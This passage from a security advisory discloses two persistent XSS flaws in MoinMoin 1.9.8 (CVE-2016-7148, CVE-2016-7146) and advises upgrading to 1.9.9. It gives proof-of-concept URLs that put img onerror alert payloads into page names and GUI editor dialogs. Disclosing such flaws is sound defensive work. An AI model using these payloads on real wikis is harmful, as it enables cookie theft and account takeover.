2. Overview

MoinMoin is an open source Wiki application written in python. In version
1.9.8, it is vulnerable to two persistent XSS issues. This allows an attacker
to steal cookies, inject JavaScript keyloggers, or bypass CSRF protection.

3. Details

XSS 1: Persistent XSS (CVE-2016-7148)

CVSS: Medium 5.0 AV:N/AC:L/Au:N/C:N/I:P/A:N

Description: A page name is echoed in the attach file page without encoding,
leading to persistent XSS.

Proof of Concept:

To place the payload create a new page which contains the payload as name by
visiting: http://localhost:9090/
newtest%27%22%3E%3Cimg%20src%3Dno%20onerror%3Dalert%287%29%3E?action=edit To
trigger the payload visit the attach file page: http://localhost:9090/
newtest%27%22%3E%3Cimg%20src%3Dno%20onerror%3Dalert%287%29%3E?action=AttachFile
Note that there must be at least one existing attachment.

XSS 2: Persistent XSS (CVE-2016-7146)

CVSS: Medium 5.0 AV:N/AC:L/Au:N/C:N/I:P/A:N

Description: The GUI editor is vulnerable to XSS via a specifically crafted
URL, as it echoes part of the URL without encoding in two different places. The
issue can be exploited reflected or persistent.

Proof of Concept:

Reflected example (the page does not have to exist): http://localhost:9090/'">
<img src=no onerror=alert(1)>?action=fckdialog&dialog=attachment Alternatively,
an attacker can create a page containing the payload: http://localhost:9090/
newtestfoo'%22%3E%3Cimg%20src=no%20onerror=alert(1)%3E The payload is triggered
when attaching a file via the the GUI editor ("Edit (GUI)" -> "Attachment").

4. Solution

To mitigate this issue please upgrade at least to version 1.9.9:
